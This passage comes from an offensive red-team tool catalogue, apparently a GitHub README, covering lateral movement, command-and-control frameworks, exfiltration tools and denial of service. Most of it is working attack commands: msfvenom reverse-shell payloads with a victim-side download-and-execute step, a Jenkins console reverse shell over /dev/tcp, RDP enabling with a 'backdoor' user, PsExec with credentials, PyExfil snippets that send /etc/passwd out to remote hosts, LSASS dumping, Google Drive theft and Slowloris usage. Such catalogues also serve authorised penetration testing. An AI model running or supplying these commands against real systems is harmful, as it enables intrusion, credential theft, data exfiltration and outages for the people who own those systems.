Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/PSTools.zip' -OutFile 'pstools.zip'
Expand-Archive -Path 'pstools.zip' -DestinationPath "$env:TEMP\pstools"
Move-Item -Path "$env:TEMP\pstools\psexec.exe" .
Remove-Item -Path "$env:TEMP\pstools" -Recurse
```

**Usage:** 

```bash
# Prevent the license agreement from being displayed
psexec.exe /accepteula

# Run the 'hostname' command on remote machine
psexec.exe \\REMOTECOMPUTER hostname

# Run the 'hostname' command on EVERYTHING (on the domain)
psexec.exe \\* hostname

# Run a local executable on a remote machine
psexec.exe \\REMOTECOMPUTER -c C:\Tools\program.exe

# Run the 'hostname' command with different credentials
psexec.exe \\REMOTECOMPUTER hostname -u localadmin -p secret-p@$$word

# Spawn shell on remote machine
psexec.exe -s \\REMOTECOMPUTER cmd
```

Great [blog post](https://adamtheautomator.com/psexec/) on PsExec usage.

![image](https://user-images.githubusercontent.com/100603074/210266376-8daa51d6-16d4-4422-b723-d1bc8b7f22e2.png)

*Image used from https://adamtheautomator.com/psexec/*

### [🔙](#tool-list)Enabling RDP

```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net localgroup "Remote Desktop Users" "backdoor" /add
```

### [🔙](#tool-list)Upgrading shell to meterpreter

Shells (https://infinitelogins.com/tag/payloads/)

After getting basic shell access to an endpoint a meterpreter is nicer to continue with.

**[attacker]** Generate a meterpreter shell:

```shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

![image](https://user-images.githubusercontent.com/100603074/193451669-ff745cf6-e103-4f7e-a266-f7f224dfbb0a.png)

**[victim]** Download to victim endpoint: 

```shell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"`
```

**[attacker]** Configure listener: 

```shell
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST your-ip 
set LPORT listening-port run`
```

**[victim]** Execute payload:

```shell
Start-Process "shell-name.exe"`
```

![image](https://user-images.githubusercontent.com/100603074/193452305-91b769a7-96c4-43d3-b3e2-6e31b3afec27.png)

### [🔙](#tool-list)Forwarding Ports	

Sometimes, after gaining access to an endpoint there are local ports. Making these internal ports external routable can help for lateral movement to other services on the host.

```bash
socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
socat TCP-LISTEN:EXTERNAL_PORT,fork TCP:127.0.0.1:INTERNAL_PORT &
```

### [🔙](#tool-list)Jenkins reverse shell

If you gain access to a jenkins script console you can use this to gain a reverse shell on the node.

```jenkins
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP_ADDRESS/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Collection
====================

### [🔙](#tool-list)[BloodHound](https://github.com/BloodHoundAD/BloodHound)

An application used to visualize active directory environments. A quick way to visualise attack paths and understand victims' active directory properties.

**Install:** [PenTestPartners Walkthrough](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/)

**Custom Queries:** [CompassSecurity BloodHoundQueries](https://github.com/CompassSecurity/BloodHoundQueries) 

![image](https://user-images.githubusercontent.com/100603074/206549387-a63e5f0e-aa75-47f6-b51a-942434648ee2.png)

### [🔙](#tool-list)[Snaffler](https://github.com/SnaffCon/Snaffler)

Snaffler is an advanced credential scanner/collector for Active Directory environments. *With a great [README](https://github.com/SnaffCon/Snaffler/blob/master/README.md)*.

Snaffler uses a system of "classifiers", each of which examine shares or folders or files or file contents, passing some items downstream to the next classifier, and discarding others. Each classifier uses a set of rules to decide what to do with the items it classifies.

*More information about Snaffler [rules](https://github.com/SnaffCon/Snaffler#i-am-a-mighty-titan-of-tedium-a-master-of-the-mundane-i-wish-to-write-my-own-ruleset).*

'*Broadly speaking - it gets a list of Windows computers from Active Directory, then spreads out its snaffly appendages to them all to figure out which ones have file shares, and whether you can read them.*' - Snaffler README (2023)

**Install:** 

You can download the binary from the [GitHub Releases Page](https://github.com/SnaffCon/Snaffler/releases).

**Usage:** 

```bash
# Targeted local scan (less likely to trigger detections)
Snaffler.exe -s -i C:\

# Go in loud and find everything
snaffler.exe -s -o snaffler.log
```

![image](https://user-images.githubusercontent.com/100603074/210266420-a658a48e-2945-4d06-9aff-e3fb14664829.png)

*Image used from https://github.com/SnaffCon/Snaffler#what-does-it-look-like*

Command and Control
====================

### [🔙](#tool-list)[Havoc](https://github.com/HavocFramework/Havoc)

Havoc is a modern and malleable post-exploitation command and control framework, created by [@C5pider](https://twitter.com/C5pider).

Features include: Sleep Obfuscation, x64 return address spoofing, Indirect Syscalls for Nt* APIs

**Pre-requisites:** (Ubuntu 20.04 / 22.04)

```bash
sudo apt install build-essential
sudo add-apt-repository ppa:deadsnakes/ppa
sudo apt update
sudo apt install python3.10 python3.10-dev
```

**Build + Usage:**

```bash
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc/Client
make 
./Havoc 
```

**Pre-requisites:** (Ubuntu 20.04 / 22.04)

```bash
cd Havoc/Teamserver
go mod download golang.org/x/sys  
go mod download github.com/ugorji/go
```

**Build + Usage:**

```bash
cd Teamserver
./Install.sh
make
./teamserver -h
```

**Run the teamserver**

```bash
sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```

*Full install, build and run instructions on the [wiki](https://github.com/HavocFramework/Havoc/blob/main/WIKI.MD)*

![image](https://user-images.githubusercontent.com/100603074/206025215-9c7093e5-b45a-4755-81e6-9e2a52a1f455.png)

### [🔙](#tool-list)[Covenant](https://github.com/cobbr/Covenant)

Covenant is a .NET command and control framework, it has a web interface that allows for multi-user collaboration.

It can be used to remotely control compromised systems and perform a variety of different tasks, including executing arbitrary code, capturing keystrokes, exfiltrating data, and more.

**Install: (Dotnet Core)** 

You can download dotnet core for your platform from [here](https://dotnet.microsoft.com/download/dotnet-core/3.1).

**Note:** *After starting Covenant, you must register an initial user through the web interface. Navigating to the web interface will allow you to register the initial user*

```bash
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
```

**Usage: (Dotnet Core)** 

```bash
~/Covenant/Covenant > dotnet run
warn: Microsoft.EntityFrameworkCore.Model.Validation[10400]
      Sensitive data logging is enabled. Log entries and exception messages may include sensitive application data, this mode should only be enabled during development.
WARNING: Running Covenant non-elevated. You may not have permission to start Listeners on low-numbered ports. Consider running Covenant elevated.
Covenant has started! Navigate to https://127.0.0.1:7443 in a browser
```

**Install: (Docker)**

```bash
# Build the docker image:
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
~/Covenant/Covenant > docker build -t covenant .
```

**Usage: (Docker)** 

```bash
# Run Covenant within the Docker container
~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v </absolute/path/to/Covenant/Covenant/Data>:/app/Data covenant

# Stop the container
~/Covenant/Covenant > docker stop covenant

# Restart Covenant interactively
~/Covenant/Covenant > docker start covenant -ai
```

Full installation and startup instructions can be found on the wiki [here](https://github.com/cobbr/Covenant/wiki/Installation-And-Startup).

![image](https://user-images.githubusercontent.com/100603074/210168138-58473fc0-4361-41ec-9439-2f2fcb159520.png)

*Image from https://github.com/cobbr/Covenant*

### [🔙](#tool-list)[Merlin](https://github.com/Ne0nd0g/merlin)

Merlin is an open-source post-exploitation framework that is designed to be used after a initial compromise of a system.

It is written in Python and can be used to perform a variety of different tasks, such as executing arbitrary code, moving laterally through a network, and exfiltrating data.

**Install:** 

1. Download the latest compiled version of Merlin Server from the [releases](https://github.com/Ne0nd0g/merlin/releases) section
2. Extract the files with 7zip using the x function The password is: merlin
3. Start Merlin
4. Configure a [listener](https://merlin-c2.readthedocs.io/en/latest/server/menu/listeners.html)
5. Deploy an agent. See [Agent Execution Quick Start Guide](https://merlin-c2.readthedocs.io/en/latest/quickStart/agent.html) for examples

```bash
mkdir /opt/merlin;cd /opt/merlin
wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
7z x merlinServer-Linux-x64.7z
sudo ./merlinServer-Linux-x64
```

**Usage:** 

1. Ensure the Merlin server is running with a configured listener
2. Download and deploy an agent to the victim
3. Execute agent

For detailed usage information see the official Merlin [wiki](https://merlin-c2.readthedocs.io/en/latest/server/menu/main.html).

![image](https://user-images.githubusercontent.com/100603074/210168329-57c77e4f-213c-4402-8dd8-70ac3bcabcfe.png)

*Image from https://www.foregenix.com/blog/a-first-look-at-todays-command-and-control-frameworks*

### [🔙](#tool-list)[Metasploit Framework](https://github.com/rapid7/metasploit-framework)

Metasploit is an open-source framework for developing, testing, and using exploit code.

The Metasploit framework includes a large number of pre-built exploits and payloads, as well as a fully-featured integrated development environment (IDE) for creating and testing custom exploits.

**Install: (Installer)** 

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

**Usage:** 

```bash
/opt/metasploit-framework/bin/msfconsole
```

Full installation instructions can be found on the official [wiki](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html).

[Rapid7 Metasploit blogs](https://www.rapid7.com/blog/tag/metasploit/)

[Cheat sheet graphic](https://cdn.comparitech.com/wp-content/uploads/2019/06/Metasploit-Cheat-Sheet.webp)

[Nice command list](https://github.com/security-cheatsheet/metasploit-cheat-sheet)

![image](https://user-images.githubusercontent.com/100603074/210168463-f1ac1edb-2f0e-4008-a8ba-308f3a741a9e.png)

*Image used from https://goacademy.io/how-to-install-metasploit-on-kali-linux/*

### [🔙](#tool-list)[Pupy](https://github.com/n1nj4sec/pupy)

Pupy is an opensource, cross-platform (Windows, Linux, OSX, Android) C2 and post-exploitation framework written in python and C.

It allows an attacker to remotely control a victim's computer and execute various actions, such as command execution, key logging, and taking screen shots.

**Install: (Git)** 

```bash
sudo apt install git libssl1.0-dev libffi-dev python-dev python-pip build-essential swig tcpdump python-virtualenv
git clone --recursive https://github.com/n1nj4sec/pupy
cd pupy
python create-workspace.py -DG pupyw
```

Roll fix to fix the error:

```bash
sudo pip2 install rpyc==3.4.4
```

Start:

```bash
export PATH=$PATH:~/.local/bin; pupysh
pupyws/bin/pupysh
```

*Git install instructions used from [here](https://kalitut.com/how-to-install-pupy/).*

**Install: (Docker)** 

For detailed docker and pupy installation instructions see the [wiki](https://github.com/n1nj4sec/pupy/wiki/Installation).

**Usage:** 

```bash
# Get help page for any builtin commands with -h
>> sessions -h
>> jobs -h
>> run -h

# Interact with session 1
>> sessions -i 1

# Run local command 'ls'
>> !ls
```

Full usage information can be found on the [wiki](https://github.com/n1nj4sec/pupy/wiki/Basic-Usage).

The wiki contains good [post exploitation information](https://github.com/n1nj4sec/pupy/wiki/Post-Exploitation).

![image](https://user-images.githubusercontent.com/100603074/210181480-d1ad1bd8-fa8d-4014-842c-3efbb35b2644.png)

*Image used from https://github.com/n1nj4sec/pupy/wiki/Screenshots*

### [🔙](#tool-list)[Brute Ratel](https://bruteratel.com/)

BruteRatel is a great command and control (C4) framework created by [@NinjaParanoid](https://twitter.com/NinjaParanoid). The framework consists of a client component 'badger' that is installed on the compromised system, and a server component 'commander' that is run by the red team.

The client and server communicate with each other using various communication channels, such as HTTP, DNS, or TCP, and can be configured to use different encoding and encryption methods to evade detection.

Some nice features:

- DNS Over HTTPS
- Indirect Syscalls
- Built-in Debugger To Detect EDR Userland Hooks
- MITRE graph integration
- Adversary TTP automation

**Install:** 

To legally get access to the framework you will need to buy a licence (1 Year $2500 per user). See the [pricing page](https://bruteratel.com/pricing/) for more information.

After purchase you can download the framework from [here](https://bruteratel.com/tabs/download/) with your Activation Key and License User ID.

**Usage:** 

```bash
# Loads a powershell script to memory which can be Invoked using psreflect
psimport

# Locks keyboard and mouse hardware input. Use ‘unlock_input’ command to unlock
lock_input

# Dumps user clipboard
dumpclip

# Enumerates basic domain information
dcenum

# Elevates user privileges to SYSTEM (Requires admin rights)
get_system

# Takes a screenshot of current desktop and stores it on the server
screenshot

# Dumps LSASS to C:\Windows\Memory.DMP using the PssCaptureSnapshot technique
shadowclone
```

Full commander terminal usage information can be found [here](https://bruteratel.com/tabs/badger/badgers/).

![image](https://user-images.githubusercontent.com/100603074/210181655-74201cad-a782-43ed-97d3-f4c0926d46c3.png)

*Image used from https://bruteratel.com/*

Exfiltration
====================

### [🔙](#tool-list)[Dnscat2](https://github.com/iagox86/dnscat2)

A tool for establishing C2 connections via DNS, even if the attacker and victim machines are behind a firewall / network address translation (NAT).

The tool is designed to be stealthy and difficult to detect, as it uses legitimate DNS traffic to transmit data.

**Install: (Compile - Server)** 

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
gem install bundler
bundle install
```

**Install: (Compile - Client)** 

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client/
make
```

Full installation information can be found in the [Installation Section](https://github.com/iagox86/dnscat2#compiling).

**Usage: (Server)** 

```bash
# Establish the server
ruby ./dnscat2.rb DOMAIN.COM
```

**Usage: (Client)** 

```bash
# Establish the client with authoritative domain
./dnscat2 DOMAIN.COM

# Establish the client without authoritative domain
./dnscat2 --dns host=0.0.0.0,port=0000

# Ping the server from the client
./dnscat --ping DOMAIN.COM

# Ping the server from the client, with custom dns resolver ip
./dnscat --dns server=0.0.0.0,domain=DOMAIN.COM --ping
```

**Usage: (Tunnels)** 

```bash
# (After establishing the client) You can open a new tunnelled port
listen [lhost:]lport rhost:rport

# Forward ssh connections through the dnscat2 client to an internal device
listen 127.0.0.1:2222 10.10.10.10:22
```

Full usage information can be found in the [Usage Section](https://github.com/iagox86/dnscat2#usage). 

![image](https://user-images.githubusercontent.com/100603074/210116521-0ef905ec-cc14-4cdc-9831-46bbded8c6af.png)

### [🔙](#tool-list)[Cloakify](https://github.com/TryCatchHCF/Cloakify)

When exfiltrating victim files, DLP (Data Loss Prevention) solutions will typically trigger on strings within these files. Cloakify reduces this risk by transforming the data.

Cloakify transforms any filetype (e.g. .zip, .exe, .xls, etc.) into a list of harmless-looking strings. This lets you hide the file in plain sight, and transfer the file without triggering alerts.

**Note:** You can make your own ciphers, see [here](https://github.com/TryCatchHCF/Cloakify#create-your-own-cipers) for more info.

**Install:** 

```bash
git clone https://github.com/TryCatchHCF/Cloakify
```

**Usage:** 

```bash
# Cloakify some text
python3 cloakify.py TEXT.txt ciphers/desserts.ciph > TEXT.cloaked

# De-Cloakify the text
python3 decloakify.py TEXT.cloaked ciphers/desserts.ciph
```

![image](https://user-images.githubusercontent.com/100603074/210117067-4611a42a-2ac7-44af-8aee-2e448c05909b.png)

![image](https://user-images.githubusercontent.com/100603074/210116996-8ec36a12-8eef-44e9-924a-ad179e599910.png)

### [🔙](#tool-list)[PyExfil](https://github.com/ytisf/PyExfil)

"An Alpha-Alpha stage package, not yet tested (and will appreciate any feedbacks and commits) designed to show several techniques of data exfiltration is real-world scenarios."

**Install:** 

```bash
git clone https://www.github.com/ytisf/PyExfil;cd PyExfil;pip install -r requirements.txt;pip install py2exe;pip setup.py install
```

**Usage:** (Full Usage [here](https://github.com/ytisf/PyExfil/blob/master/USAGE.md))

#### HTTP Cookies

```python
from pyexfil.network.HTTP_Cookies.http_exfiltration import send_file, listen

# For Client (exfil)
send_file(addr='http://www.morirt.com', file_path=FILE_TO_EXFIL)

# For Server (collecting)
listen(local_addr='127.0.0.1', local_port=80)
```

#### ICMP Echo 8

```python
from pyexfil.network.ICMP.icmp_exfiltration import send_file, init_listener

# For Client (exfil)
ip_addr = "127.0.0.1"
send_file(ip_addr, src_ip_addr="127.0.0.1", file_path="", max_packetsize=512, SLEEP=0.1)

# For Server (collecting)
init_listener(ip_addr, saving_location="/tmp/")
```

#### NTP Request

```python
from pyexfil.network.NTP.ntp_exfil import exfiltrate, ntp_listen, NTP_UDP_PORT

# For Client (exfil)
ip_addr = "127.0.0.1"
exfiltrate("/etc/passwd", ip_addr, time_delay=0.1)

# For Server (collecting)
ntp_listener(ip="0.0.0.0", port=NTP_UDP_PORT)
```

![image](https://user-images.githubusercontent.com/100603074/206573575-e90384c4-4a39-4f3c-96ec-face1f191808.png)

### [🔙](#tool-list)[Powershell RAT](https://github.com/Viralmaniar/Powershell-RAT)

Python based backdoor that uses Gmail to exfiltrate data as an e-mail attachment. It tracks the user activity using screen capture and sends the information to an attacker as an e-mail attachment.

**Install:** 

```bash
git clone https://github.com/Viralmaniar/Powershell-RAT
```

**Usage:** (Full Usage [here](https://github.com/Viralmaniar/Powershell-RAT/blob/master/README.md))

#### Setup

- Throwaway Gmail address
- Enable "Allow less secure apps" by going to https://myaccount.google.com/lesssecureapps
- Modify the `$username` & `$password` variables for your account in the Mail.ps1 Powershell file
- Modify `$msg.From` & `$msg.To.Add` with throwaway gmail address

![image](https://user-images.githubusercontent.com/100603074/210267906-68a2e852-d7b5-4b61-a747-77844e1d7d99.png)

### [🔙](#tool-list)[GD-Thief](https://github.com/antman1p/GD-Thief)

Tool for exfiltrating files from a target's Google Drive that you have access to, via Google's API.

This includes all shared files, all files from shared drives, and all files from domain drives that the target has access to.

**Install:** 

```bash
git clone https://github.com/antman1p/GD-Thief.git
cd GD-Thief
pip install --upgrade google-api-python-client google-auth-httplib2 google-auth-oauthlib
```

then...

1. Create a new Google Cloud Platform (GCP) project
2. Enable a Google Workspace API
3. Configure OAuth Consent screen
4. Create a credential
5. Add the victim's Google account to the Application's Test Users

For detailed setup instructions see the [How To Guide](https://github.com/antman1p/GD-Thief#how-to).

**Usage:** 

```bash
usage:
python3 gd_thief.py [-h] -m [{dlAll, dlDict[-d <DICTIONARY FILE PATH>]}
	[-t <THREAD COUNT>]

help:

This Module will connect to Google's API using an access token and exfiltrate files
from a target's Google Drive.  It will output exfiltrated files to the ./loot directory

arguments:
        -m [{dlAll, dlDict}],
                --mode [{dlAll, dlDict}]
                The mode of file download
                Can be "dlAll", "dlDict [-d <DICTIONARY FILE PATH>]", or... (More options to come)

optional arguments:
        -d <DICTIONARY FILE PATH>, --dict <DICTIONARY FILE PATH>
                        Path to the dictionary file. Mandatory with download mode"-m, --mode dlDict"
                        You can use the provided dictionary, per example: "-d ./dictionaries/secrets-keywords.txt"
        -t <THREAD COUNT>, --threads <THREAD COUNT>
                        Number of threads. (Too many could exceeed Google's rate limit threshold)

        -h, --help
                show this help message and exit
```

Nice [blog post](https://antman1p-30185.medium.com/youre-a-gd-thief-1e02358fd557) explaining the logic behind the tool.

Impact
====================

### [🔙](#tool-list)[SlowLoris](https://github.com/gkbrk/slowloris)

Slowloris is a type of denial-of-service (DoS) attack that involves sending HTTP requests to a web server in a way that ties up the server's resources, preventing it from being able to process legitimate requests. 

This attack would typically be conducted with a botnet, it is designed to be difficult to detect and mitigate, as it uses a relatively small number of connections and does not generate a large amount of traffic.

**Install: (Pip)** 

```bash
sudo pip3 install slowloris
```

**Install: (Git)** 

```bash
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
```

**Usage:** 

```bash
# Pip
slowloris example.com

# Git
python3 slowloris.py example.com
```

![image](https://user-images.githubusercontent.com/100603074/210115630-b6541ee0-ad82-471a-9a7e-7f0ec028c67d.png)
